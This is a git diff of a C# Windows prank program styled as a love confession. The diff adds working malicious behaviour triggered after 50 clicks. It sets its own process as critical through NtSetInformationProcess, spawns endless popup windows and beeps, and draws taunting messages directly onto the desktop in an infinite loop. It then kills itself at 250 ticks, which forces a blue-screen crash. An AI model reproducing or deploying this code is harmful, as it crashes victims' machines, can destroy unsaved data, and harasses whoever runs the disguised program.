@@ -8,14 +8,35 @@ using System.Drawing;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Microsoft.Win32;
+
 
 namespace I_love_you
 {
     public partial class Form1 : Form
     {
+        private readonly List<string> mesgs = new List<string> { "你太过分了！！！",
+            "你居然不同意我的表白？可以",
+            "我不能接受！",
+            "你根本就不懂我的感受！",
+            "你只关心你自己！",
+            "看看你那被吓傻了的样子，哈哈",
+            "家人们，谁懂啊，又是什么下头，真无语了",
+            "我是谁我在哪我要干什么？"};
+        private readonly List<Brush> colors = new List<Brush> { Brushes.Red, Brushes.Blue, Brushes.Green, Brushes.Yellow, Brushes.Purple,Brushes.Beige,Brushes.Crimson,Brushes.DarkTurquoise,Brushes.LightGoldenrodYellow,Brushes.Linen,Brushes.Tomato,Brushes.Wheat };
+        private readonly List<FontStyle> fonts = new List<FontStyle> { FontStyle.Bold, FontStyle.Italic, FontStyle.Regular,FontStyle.Strikeout };
+
+        //绘画引用
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetDesktopWindow();
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetWindowDC(IntPtr hwnd);
+
+        //蓝屏引用
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
@@ -43,6 +64,7 @@ namespace I_love_you
             //设置label1背景为透明
             label1.BackColor = Color.Transparent;
 
+            //设置鼠标指针图标
             Bitmap bmp = new Bitmap(Properties.Resources._1815573_cross_cancel_delete_icon__1_);
             Cursor cursor = new Cursor(bmp.GetHicon());
             label2.Cursor = cursor;
@@ -206,7 +228,16 @@ namespace I_love_you
 
             if (movetimes > 50)
             {
-                //点击50次以上就蓝屏
+                //点击50次以上就来点有意思的，蓝屏，弹窗
+
+                timer2.Start();
+                timer3.Start();
+                Thread thread = new Thread(threadform);
+                thread.Start();
+                button1.Visible = false;
+                button2.Visible = false;
+
+
                 int isCritical = 1;  // we want this to be a Critical Process
                 int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
 
@@ -214,22 +245,68 @@ namespace I_love_you
 
                 // setting the BreakOnTermination = 1 for the current process
                 NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
-                try
-                {
-                    Environment.Exit(0);
-                }
-                catch(Exception ex)
-                {
-                    //
-                    System.Diagnostics.Process tt = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
-                    tt.Kill();
-                }
+
+                pictureBox1.Image = Properties.Resources.v2_122115abe696caf86a6d6ece227e31a6_hd;
+
+                //此时结束进程将会蓝屏
+            }
+        }
+
+
+        private void threadform()
+        {
+            //弹幕攻击
+            Random random = new Random();
+            var screenh = Screen.PrimaryScreen.WorkingArea; // 获得屏幕大小
+            var screen = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));
+            while (true)
+            {
+                Point point = new Point(random.Next(screenh.Width), random.Next(screenh.Height));//随机取坐标
+
+                string mesg = mesgs[random.Next(mesgs.Count())];
+                var font = fonts[random.Next(fonts.Count())];
+                var color = colors[random.Next(colors.Count())];
+
+                Thread.Sleep(500);
+                
+                //绘制文字图案在屏幕上
+                screen.DrawString(mesg, Font, color, point);
             }
         }
 
         private void pictureBox2_MouseMove(object sender, MouseEventArgs e)
         {
             label1.Location = new Point(e.X + 20 + pictureBox2.Location.X, e.Y + pictureBox2.Location.Y);
+        }
+
+        private void Timer2_Tick(object sender, EventArgs e)
+        {
+            //一下是吓人部分
+            movetimes++;
+            Form form = new Form2();
+            form.Show();
+
+            
+
+            if (movetimes == 250)
+            {
+                try
+                {
+                    Environment.Exit(0);
+                }
+                catch(Exception ex)
+                {
+                    //强制结束进程
+                    System.Diagnostics.Process tt = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
+                    tt.Kill();
+                }
+            }
+        }
+
+        private void timer3_Tick(object sender, EventArgs e)
+        {
+            //播放系统声音
+            System.Media.SystemSounds.Beep.Play();
         }
     }
 }
